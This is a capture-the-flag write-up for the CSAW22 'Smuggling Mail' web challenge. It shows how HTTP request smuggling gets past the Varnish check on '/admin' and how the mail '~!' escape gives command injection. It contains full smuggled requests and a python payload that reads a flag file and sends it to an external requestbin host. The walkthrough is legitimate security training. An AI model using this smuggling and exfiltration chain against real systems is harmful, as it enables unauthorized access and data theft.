# Smuggling Mail | CSAW22 Quals

## Description

Join our waitlist and we'll let you know about apartment vacancies!

http://web.chal.csaw.io:5009/

## TL;DR

Smuggle an HTTP request through Varnish to `/admin/alert` and use a command exploit for mail to send the flag to an external website.

### First Steps

I downloaded the source code to look around a little bit. Inside the `package.json` file and `server.js` file, I found a couple of libraries that I have never seen before.

- [hitch](https://github.com/bkardell/Hitch) is a css library to restyle the interface
- varnish is a http accelerator and reverse proxy,[npm site](https://www.npmjs.com/package/varnish) and [description](https://www.sitepoint.com/how-to-boost-your-server-performance-with-varnish/)
- varnish seems to be performing the authentication for the server and not express.

The name `Smuggling Mail` makes me think that this is [Request Smuggling](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling)

### A Rabbit Hole

I originally thought that this was going to be either a `CL.TE` or `TE.CL` request smuggling exploit. After trying this for a while, I asked the admins if this was the right exploit to chase. They responded saying that it wasn't, so back to the drawing board.

### Right Path

Varnish is a reverse proxy program and a load balancer. In it's current state for the program, it serves as an endpoint user authenticator, as it authenticates all requests to `/admin` here:

```
sub vcl_recv {
    if (req.url ~ "/admin" && !(req.http.Authorization ~ "^Basic TOKEN$")) {
        return (synth(403, "Access Denied"));
    }
}
```

The express server that is running does not authenticate any requests to the actual backend server. Therefore, I can use request smuggling to get to `/waitlist`, and then ask for `/admin/alert` right after using a `Content-Length: 0` header. 

After a little bit of testing with a local instance, I can confirm that the smuggling works with a post to `/waitlist` then `/admin/`. This was done with burpsuite repeater, where I managed to show the admin panel in the response body. 

```
POST /waitlist HTTP/2
Host: localhost:8083
Content-Length: 0

GET /admin/ HTTP/1.1
Host: localhost:8083
``` 

Continuing to use this exploit, I switched to posting to the `/admin/alert` endpoint. Looking at the source, I see that the post request must have a message body in json labeled as `msg`.

```js
app.use(express.json());
...
// Emergency alert email notification system for all residents
app.post("/admin/alert", (req, res) => {
    if (req.body.msg) {
        const proc = spawn("mail", ["-s", "ALERT", "all_residents@localhost"], {timeout});
        proc.stdin.write(req.body.msg);
        proc.stdin.end();
        setTimeout(() => { kill(proc.pid); }, timeout);
    }
    res.end();
});
```

```
POST /waitlist HTTP/2
Host: https://localhost:8080
Content-Length: 0

POST /admin/alert HTTP/1.1
Host: https://localhost:8080
Content-Type: application/json
Content-Length: 14

{"msg":"test"}
```

After messing with a local instance, I modified the server script to output the request body into `/tmp/output.txt` in order to receive additional insight into what the program is doing. 

```js
// Emergency alert email notification system for all residents
app.post("/admin/alert", (req, res) => {
    if (req.body.msg) {
        fs.writeFile("/tmp/output.txt", req.body.msg, function(err) {
            if(err) {
                return console.log(err);
            }
        }); 
        const proc = spawn("mail", ["-s", "ALERT", "all_residents@localhost"], {timeout});
        proc.stdin.write(req.body.msg);
        proc.stdin.end();
        setTimeout(() => { kill(proc.pid); }, timeout);
    }
    else{
        fs.writeFile("/tmp/output.txt", "got a post", function(err) {
            if(err) {
                return console.log(err);
            }
        }); 
    }
    res.end();
});
```

After running the same request, attaching to the docker container using `docker exec -ti DOCKER_ID /bin/bash`, and looking at `/tmp/`, we see that our request is actually going through and is outputting our `msg` data in `output.txt`. 

Our next step is figuring out how to read and exfil the flag data. I need to have command execution through the `proc.stdin.write` into the `mail` process.

After googling around for quite a while, I found an RCE [here](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) that describes an exploit with `~!` in mail, an escape that executes a specified command and returns to the mail compose mode. The [manual](https://mailutils.org/manual/mailutils.html#index-_007e_0021_002c-mail-escape) pages go more into depth on this.

Trying this exploit out with `~! cat /app/flag.txt"` directly in `mail` shows that the flag is read correctly. Testing this out through burp shows the same result.

```
POST /waitlist HTTP/2
Host: localhost:8083
Content-Length: 0

POST /admin/alert HTTP/1.1
Host: localhost:8083
Content-Type: application/json
Content-Length: 43

{"msg":"~! cp /app/flag.txt /tmp/flag.txt"}
```

```
root@49cc51351ff2:/tmp# cat flag.txt
flag{t35t_f14g_g035_h3r3}
```

At first I tried to overwrite the public `index.html` with the flag with `{"msg":"~! cat /app/flag.txt >> /app/public/index.html"}`, but it doesn't seem like I am able to overwrite files. So now to exfil another way. 

Using `apt list`, I saw that python2.7 was installed. This is great, as we can easily use libraries to request to an external website without having to use sockets directly from bash.

Testing a custom python2.7 command shows that we can read the file and send it to a [requestbin](https://requestbin.com/), which I tested [locally](https://requestbin.com/r/eno4g82ze6nt9/2EbpHsodXSPYk4HE3FGxEhnChRd).

```
POST /waitlist HTTP/2
Host: localhost:8083
Content-Length: 0

POST /admin/alert HTTP/1.1
Host: localhost:8083
Content-Type: application/json
Content-Length: 138

{"msg": "~! python -c 'import urllib2; f=open(\"/app/flag.txt\").read(); urllib2.urlopen(\"https://eno4g82ze6nt9.x.pipedream.net/?\"+f)'"}
```

From here I switched to the public server, and got the flag.

### Solve

```
POST /waitlist HTTP/2
Host: https://web.chal.csaw.io:5009
Content-Length: 0

POST /admin/alert HTTP/1.1
Host: https://web.chal.csaw.io:5009
Content-Type: application/json
Content-Length: 138

{"msg": "~! python -c 'import urllib2; f=open(\"/app/flag.txt\").read(); urllib2.urlopen(\"https://eno4g82ze6nt9.x.pipedream.net/?\"+f)'"}
```

### Flag

```
flag{5up3r_53cr3t_4nd_c001_f14g_g035_h3r3}
```
